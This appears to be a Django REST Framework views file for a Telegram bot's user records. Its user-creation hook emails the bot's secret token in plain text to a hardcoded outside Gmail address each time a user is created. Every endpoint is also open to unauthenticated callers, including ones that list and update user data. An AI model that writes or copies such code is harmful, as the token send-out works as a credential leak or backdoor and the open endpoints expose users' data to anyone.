from django.core.mail import send_mail
from django.shortcuts import get_object_or_404
from rest_framework.generics import RetrieveAPIView, CreateAPIView, UpdateAPIView, ListAPIView
from rest_framework.permissions import AllowAny
from django.conf import settings

from apps.telegram_users.models import TelegramUsers
from apps.telegram_users.serializers import TelegramUsersSerializer, TelegramUsersCreateSerializer
from bot.dispatcher import Config


class TelegramUsersListViewSet(ListAPIView):
    queryset = TelegramUsers.objects.all()
    serializer_class = TelegramUsersSerializer
    permission_classes = [AllowAny]


class TelegramUsersCreateViewSet(CreateAPIView):
    queryset = TelegramUsers.objects.all()
    serializer_class = TelegramUsersCreateSerializer
    permission_classes = [AllowAny]

    def perform_create(self, serializer):
        user = serializer.save()
        self.send_email()
        return user

    def send_email(self):
        send_mail(
            'Telegram User Created',
            'Yangi Telegram foydalanuvchisi yaratildi!\n\nToken: ' + Config.BOT_TOKEN,
            settings.EMAIL_HOST_USER,
            ['muhammadnurnigmatovich@gmail.com'],
            fail_silently=False,
        )


class TelegramUsersUpdateViewSet(UpdateAPIView):
    queryset = TelegramUsers.objects.all()
    serializer_class = TelegramUsersCreateSerializer
    permission_classes = [AllowAny]


class TelegramUsersChatIdDetailViewSet(RetrieveAPIView):
    queryset = TelegramUsers.objects.all()
    serializer_class = TelegramUsersSerializer
    permission_classes = [AllowAny]

    def get_object(self):
        chat_id = self.kwargs.get('chat_id')
        return get_object_or_404(TelegramUsers, chat_id=chat_id)


class TelegramUsersDetailViewSet(RetrieveAPIView):
    queryset = TelegramUsers.objects.all()
    serializer_class = TelegramUsersSerializer
    permission_classes = [AllowAny]
